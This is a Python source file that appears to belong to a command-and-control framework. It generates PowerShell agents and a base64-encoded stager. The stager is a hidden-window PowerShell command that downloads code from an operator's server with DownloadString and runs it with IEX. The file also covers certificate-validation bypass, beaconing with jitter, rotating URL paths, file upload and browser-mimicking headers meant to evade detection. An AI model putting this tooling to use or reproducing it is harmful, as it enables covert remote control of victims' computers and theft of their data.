import os
import base64
import json
import time
import shutil

def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
    """
    Generate a Base64 encoded PowerShell agent stager
    
    Args:
        host: Server hostname or IP
        port: Server port
        ssl: Whether to use SSL/TLS
        campaign_folder: Path to the campaign folder
        
    Returns:
        String containing the generated PowerShell Base64 command
    """
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Get custom URL paths from url_paths.json if it exists
    url_paths_file = os.path.join(campaign_folder, "url_paths.json")
    url_paths = {
        "beacon_path": "/beacon",
        "agent_path": "/raw_agent",
        "stager_path": "/b64_stager",
        "cmd_result_path": "/command_result",
        "file_upload_path": "/file_upload"
    }
    
    if os.path.exists(url_paths_file):
        try:
            with open(url_paths_file, 'r') as f:
                custom_paths = json.load(f)
                url_paths.update(custom_paths)
        except Exception as e:
            print(f"Warning: Could not load URL paths: {e}")
    
    # Make sure all paths start with a leading slash
    for key in url_paths:
        if not url_paths[key].startswith('/'):
            url_paths[key] = '/' + url_paths[key]
    
    # Get the key information for documentation
    keys_file = os.path.join(campaign_folder, "keys.json")
    key_info = "Using campaign encryption key"
    key_base64 = None
    
    if os.path.exists(keys_file):
        try:
            with open(keys_file, 'r') as f:
                keys_data = json.load(f)
                key_base64 = keys_data.get("primary")
            key_info = f"Using encryption key from keys.json"
        except Exception as e:
            key_info = f"Warning: Error reading keys file: {e}"
            key_base64 = None
    
    if not key_base64:
        # Generate a random key if none exists
        key = os.urandom(32)  # 256-bit key
        key_base64 = base64.b64encode(key).decode('utf-8')
    
    http = "https" if ssl else "http"
    server_address = f"{host}:{port}"
    
    # Get agent configuration
    beacon_interval = 5  # Default
    jitter_percentage = 20  # Default
    max_failures = 3  # Default
    max_backoff = 300  # Default
    
    # Try to load agent config
    agent_config_file = os.path.join(campaign_folder, "agent_config.json")
    if os.path.exists(agent_config_file):
        try:
            with open(agent_config_file, 'r') as f:
                agent_config = json.load(f)
                beacon_interval = int(agent_config.get("beacon_period", beacon_interval))
                jitter_percentage = int(agent_config.get("jitter_percentage", jitter_percentage))
                max_failures = int(agent_config.get("max_failures_before_fallback", max_failures))
                max_backoff = int(agent_config.get("max_backoff_time", max_backoff))
        except Exception as e:
            print(f"Warning: Could not load agent config: {e}")
    
    # Read path rotation configuration
    rotation_enabled = True  # Default
    rotation_interval = 3600  # Default
    rotation_id = 0  # Default
    next_rotation_time = int(time.time()) + rotation_interval  # Default
    
    # Try to load path rotation state
    path_rotation_file = os.path.join(campaign_folder, "path_rotation_state.json")
    if os.path.exists(path_rotation_file):
        try:
            with open(path_rotation_file, 'r') as f:
                rotation_state = json.load(f)
                rotation_id = rotation_state.get("rotation_counter", 0)
                next_rotation_time = rotation_state.get("next_rotation_time", next_rotation_time)
                rotation_interval = rotation_state.get("rotation_interval", rotation_interval)
        except Exception as e:
            print(f"Warning: Could not load path rotation state: {e}")
    
    # Generate agents using templates
    agent_ps1, stager_cmd = generate_from_templates(
        key_base64=key_base64,
        server_address=server_address,
        beacon_path=url_paths["beacon_path"],
        cmd_result_path=url_paths["cmd_result_path"],
        file_upload_path=url_paths["file_upload_path"],
        rotation_enabled=rotation_enabled,
        rotation_id=rotation_id,
        next_rotation_time=next_rotation_time,
        rotation_interval=rotation_interval,
        beacon_interval=beacon_interval,
        jitter_percentage=jitter_percentage,
        max_failures=max_failures,
        max_backoff=max_backoff,
        use_ssl=ssl,
        http_protocol=http,
        stager_path=url_paths["stager_path"]
    )
    
    # Save the full agent code to the agents folder
    agent_file_path = os.path.join(agents_folder, "powershell_agent.ps1")
    with open(agent_file_path, 'w') as f:
        f.write(agent_ps1)
    
    # Create a more detailed information about the agent
    details = (
        f"Powershell Base64 Agent Details:\n"
        f"1. Base Command: {stager_cmd}\n"
        f"2. Encryption: {key_info}\n"
        f"3. System Identification: Full system identification enabled\n"
        f"4. SSL Validation: {'Certificate validation bypassed (required for self-signed certs)' if ssl else 'No SSL used'}\n"
        f"5. Communication Paths:\n"
        f"   - Beacon URL: {http}://{server_address}{url_paths['beacon_path']}\n"
        f"   - Agent Download URL: {http}://{server_address}{url_paths['agent_path']}\n"
        f"   - Stager URL: {http}://{server_address}{url_paths['stager_path']}\n"
        f"   - Command Result URL: {http}://{server_address}{url_paths['cmd_result_path']}\n"
        f"   - File Upload URL: {http}://{server_address}{url_paths['file_upload_path']}\n"
        f"6. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n"
        f"7. Headers: Legitimate web browsing headers included\n"
        f"8. Error Handling: Enhanced error reporting enabled\n"
        f"9. Beacon Configuration:\n"
        f"   - Interval: {beacon_interval} seconds\n" 
        f"   - Jitter: {jitter_percentage}%\n"
        f"   - Path Rotation: {'Enabled' if rotation_enabled else 'Disabled'}\n"
        f"   - Rotation Interval: {rotation_interval} seconds\n"
    )
    
    # Save detailed information
    details_file_path = os.path.join(agents_folder, "powershell_base64.txt")
    with open(details_file_path, 'w') as f:
        f.write(details)
    
    result = f"Powershell Base64:\n{stager_cmd}\n\nEncryption: {key_info}\nIdentity: Full system identification enabled"
    
    return f"Powershell Base64 agent generated and saved to {details_file_path}\n{result}"


def generate_from_templates(key_base64, server_address, beacon_path, cmd_result_path, file_upload_path,
                           rotation_enabled, rotation_id, next_rotation_time, rotation_interval,
                           beacon_interval, jitter_percentage, max_failures, max_backoff,
                           use_ssl, http_protocol, stager_path):
    """Generate the PowerShell agent code and stager from templates"""
    
    # Get template paths
    template_dir = os.path.dirname(os.path.abspath(__file__))
    templates_path = os.path.join(template_dir, "templates")
    agent_template_path = os.path.join(templates_path, "agent.template.ps1")
    path_rotation_template_path = os.path.join(templates_path, "path_rotation.template.ps1")
    
    # Ensure templates directory exists
    os.makedirs(templates_path, exist_ok=True)
    
    # Check if template files exist, if not, copy from defaults
    ensure_template_files_exist(templates_path)
    
    # Load templates
    with open(agent_template_path, 'r') as f:
        agent_template = f.read()
    with open(path_rotation_template_path, 'r') as f:
        path_rotation_template = f.read()
    
    # Fill in the path rotation template
    path_rotation_code = ""
    if rotation_enabled:
        path_rotation_code = path_rotation_template
        path_rotation_code = path_rotation_code.replace("{{ROTATION_ID}}", str(rotation_id))
        path_rotation_code = path_rotation_code.replace("{{NEXT_ROTATION_TIME}}", str(next_rotation_time))
        path_rotation_code = path_rotation_code.replace("{{ROTATION_INTERVAL}}", str(rotation_interval))
        path_rotation_code = path_rotation_code.replace("{{BEACON_PATH}}", beacon_path)
        path_rotation_code = path_rotation_code.replace("{{CMD_RESULT_PATH}}", cmd_result_path)
        path_rotation_code = path_rotation_code.replace("{{FILE_UPLOAD_PATH}}", file_upload_path)
    
    # Fill in the agent template
    agent_code = agent_template
    agent_code = agent_code.replace("{{KEY_BASE64}}", key_base64)
    agent_code = agent_code.replace("{{SERVER_ADDRESS}}", server_address)
    agent_code = agent_code.replace("{{BEACON_PATH}}", beacon_path)
    agent_code = agent_code.replace("{{CMD_RESULT_PATH}}", cmd_result_path)
    agent_code = agent_code.replace("{{FILE_UPLOAD_PATH}}", file_upload_path)
    agent_code = agent_code.replace("{{PATH_ROTATION_CODE}}", path_rotation_code)
    agent_code = agent_code.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
    agent_code = agent_code.replace("{{JITTER_PERCENTAGE}}", str(jitter_percentage))
    agent_code = agent_code.replace("{{MAX_FAILURES}}", str(max_failures))
    agent_code = agent_code.replace("{{MAX_BACKOFF}}", str(max_backoff))
    
    # Create the Base64 stager
    base_agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http_protocol}://{server_address}{stager_path}');IEX($S)"
    
    # Add SSL certificate validation bypass if using SSL
    if use_ssl:
        stager = (
            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;\n"
            "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n"
            "try {\n"
            f"    {base_agent}\n"
            "} catch {\n"
            "    $errorMessage = $_.Exception.Message\n"
            "    $errorDetails = $_ | Format-List -Force | Out-String\n"
            "    Write-Host \"Error connecting to C2: $errorMessage`n$errorDetails\"\n"
            "}"
        )
    else:
        stager = base_agent
    
    # Encode the stager
    encoded = base64.b64encode(stager.encode("UTF-8")).decode("UTF-8")
    powershell_command = f"powershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""
    
    return agent_code, powershell_command


def ensure_template_files_exist(templates_path):
    """Ensure that the template files exist, creating them if necessary"""
    agent_template_path = os.path.join(templates_path, "agent.template.ps1")
    path_rotation_template_path = os.path.join(templates_path, "path_rotation.template.ps1")
    
    # Check for existing template files in the main directory
    module_dir = os.path.dirname(os.path.abspath(__file__))
    old_agent_template = os.path.join(module_dir, "agent.template")
    old_path_rotation_template = os.path.join(module_dir, "path_rotation.template")
    
    # Agent template
    if not os.path.exists(agent_template_path):
        if os.path.exists(old_agent_template):
            # Copy from old location
            shutil.copy(old_agent_template, agent_template_path)
        else:
            # Fetch default from a default templates directory or another source
            # For now, we'll raise an error
            raise FileNotFoundError(f"Template file not found: {agent_template_path}")
    
    # Path rotation template
    if not os.path.exists(path_rotation_template_path):
        if os.path.exists(old_path_rotation_template):
            # Copy from old location
            shutil.copy(old_path_rotation_template, path_rotation_template_path)
        else:
            # Fetch default from a default templates directory or another source
            # For now, we'll raise an error
            raise FileNotFoundError(f"Template file not found: {path_rotation_template_path}")